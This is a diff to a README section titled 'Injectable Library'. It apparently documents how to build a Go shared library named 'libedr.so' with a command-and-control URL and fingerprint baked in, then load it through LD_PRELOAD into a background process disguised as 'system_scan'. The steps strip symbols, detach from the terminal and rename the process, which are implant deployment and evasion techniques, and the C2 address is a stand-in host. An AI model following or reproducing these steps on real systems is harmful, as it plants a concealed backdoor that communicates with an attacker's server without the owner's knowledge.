@@ -15,12 +15,15 @@ go build
 
 ### Injectable Library
 ```sh
-go build -v -trimpath -buildmode c-shared -o libedr.so -ldflags '
+CGO_ENABLED=1 go build -v -trimpath -buildmode c-shared -o libedr.so -ldflags '
     -w -s
     -X main.C2=https://example.com/io
-    -X Fingerprint=pSUroiq0g92Z3m08n7g/zPQyspRyjm2x/enFRndcdL0=
+    -X main.Fingerprint=pSUroiq0g92Z3m08n7g/zPQyspRyjm2x/enFRndcdL0=
 '
-echo sleep 1024 | LD_PRELOAD=./libedr.so sh </dev/null >&0 2>&0 &
+bash -c '
+    LD_PRELOAD=./libedr.so \
+    exec -a system_scan sleep 86400 &
+' </dev/null >&0 2>&1 &
 ```
 
 Usage
